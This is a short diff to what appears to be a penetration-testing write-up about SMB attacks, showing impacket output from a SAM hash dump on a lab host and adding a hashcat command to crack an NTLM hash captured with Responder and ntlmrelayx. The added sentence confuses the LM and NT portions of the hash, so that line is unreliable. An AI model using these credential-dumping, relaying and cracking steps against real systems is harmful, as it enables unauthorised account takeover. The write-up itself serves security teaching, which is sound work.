@@ -93,7 +93,9 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
             [*] Done dumping SAM hashes for host: 192.168.64.140
             [*] Stopping service RemoteRegistry
             [*] Restoring the disabled state for service RemoteRegistry
-Above figure presents a SAM Dump - We could in this instance use Hashcat with -m 1000 in the attempts to crack the NT portion of the hashes.
+Above figure presents a SAM Dump - We could in this instance use Hashcat with -m 1000 in the attempts to crack the NT portion of the hashes. We only want to crack the LM portion `fbdcd5041c96ddbd82224270b57f11fc` saved in a .txt
+
+            hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
 
 We have succesfully captured the NTLM hash from peterparker with Responder relaying the SAM authentication back to the server using impacket-ntlmrelayx. 
 
